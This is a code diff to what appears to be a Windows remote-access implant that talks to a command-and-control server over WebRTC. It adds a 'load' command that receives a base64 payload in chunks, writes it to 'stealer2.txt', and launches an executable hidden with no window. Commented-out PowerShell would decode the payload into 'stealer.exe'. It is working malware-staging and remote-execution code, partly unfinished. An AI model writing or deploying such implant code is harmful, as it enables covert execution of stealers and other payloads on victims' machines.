@@ -38,6 +38,8 @@
 
 #include <windows.h>
 #include <ShellAPI.h>
+#include <cstdlib>
+#include <fstream>
 
 
 using namespace rtc;
@@ -56,23 +58,65 @@ string localId;
 shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                 weak_ptr<WebSocket> wws, string id);
 string randomId(size_t length);
+/***
+* runScript | Runs given script and stores the log output on the given file
+***/
+int runScript(char* file_source, char* file_output) {
+	
+	SECURITY_ATTRIBUTES sa;
+	sa.nLength = sizeof(sa);
+	sa.lpSecurityDescriptor = NULL;
+	sa.bInheritHandle = TRUE;
 
+	//Creates Handle
+	HANDLE h = CreateFile(file_output, FILE_APPEND_DATA,
+	                      FILE_SHARE_WRITE | FILE_SHARE_READ, &sa, OPEN_ALWAYS,
+	                      FILE_ATTRIBUTE_NORMAL, NULL);
+
+	PROCESS_INFORMATION pi;
+	STARTUPINFO si;
+	BOOL ret = FALSE;
+	DWORD flags = CREATE_NO_WINDOW;
+
+	//Retrieve parameters and set flags on 'si'
+	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+	ZeroMemory(&si, sizeof(STARTUPINFO));
+	si.cb = sizeof(STARTUPINFO);
+	si.dwFlags |= STARTF_USESTDHANDLES;
+	si.hStdInput = NULL;
+	si.hStdError = h;
+	si.hStdOutput = h;
+
+
+	//Execute command and obtain output
+	ret = CreateProcess(NULL, file_source, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);
+
+	if (ret) {
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return 0;
+	}
+
+	return 1;
+}
 
 /***
 * createFileFromBase | Creates a binary from a base64 string
 ***/
-void createFileFromBase64String(string stringFile) {
-	const char* secondCmd =
-	    "[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($B64String))";
+void createFileFromBase64String(char* filename) {
 
-	std::string firstCmd = "$B64String = '" + stringFile + "'";
-	std::system(firstCmd.c_str());
+	/*std::ifstream ifs(filename);
+	std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));*/
+	STARTUPINFO info = {sizeof(info)};
+	PROCESS_INFORMATION processInfo;
+	/*CreateProcess(NULL,
+		"powershell.exe $FileName = Get-Content 'C:\stealer.txt'\n$Destination = 'C:\stealer.exe'\n[IO.File]::WriteAllBytes($Destination, [Convert]::FromBase64String($FileName))",
+	              NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);*/
+	//TODO Run script
+	/*CreateProcess("C:\Users\alvar\Desktop\B.exe", "> \"C:\Users\alvar\Desktop\tryinghard.txt\"", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL,
+	              NULL, &info, &processInfo);*/
 
-	std::system("$FileName = 'C:\Test.exe'");
-
-	std::system(secondCmd);
-	cout << "TEST COMPLETED**" << endl;
-	ShellExecute(NULL, "open", "C:\Test.exe", NULL, NULL, SW_SHOWDEFAULT);
+	runScript("C:\\Users\\alvar\\Desktop\\B.exe", "C:\\Users\\alvar\\Desktop\\tryinghard.txt");
 	cout << "TEST COMPLETED***" << endl;
 }
 
@@ -97,6 +141,8 @@ string parseMessage(string message) {
 	string cmd1 = "list-implants"; //Provides an updated version of implants and their respective information
 	string cmd2 = "pop-up"; //Pops up a windows with the provided message (Testing purposes)
 	string cmd3 = "system-info"; //Asks for system information 
+	string cmd4 = "load"; //Loads a given file (base64 format)
+
 
 
 	/***
@@ -131,6 +177,34 @@ string parseMessage(string message) {
 
 		auto answer = oemId + ":" + processorNumber + ":" + pageSize + ":" + processorType + ":" + activeProcessorMask;
 		return answer;
+
+	/***
+	* load | Loads a base64 string to an executable and executes it
+	***/
+	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
+		char* filename = "stealer2.txt";
+		cout << "RECEIVED DATA" << endl;
+		string numberStr = message.substr(message.find(":") + 1,
+		                                  message.find("::") +
+		                                      1); // Number of messages to retrieve in base64 string
+		int number = stoi(numberStr);
+		string data = message.substr(message.find("::") + 2); // Actual string
+		cout << number << endl;
+		if (number == 2) { //Create new file
+			std::ofstream outfile(filename);
+			outfile << data;
+			outfile.close();
+		} else if (number == 1) {//Append
+			std::ofstream outfile;
+			outfile.open(filename, std::ios_base::app);
+			outfile << data;
+			outfile.close();
+		} else {//Proceed
+			createFileFromBase64String(filename);
+		}
+		
+			
+		return "COMPLETED";
 	} else
 		cout << message << endl;
 
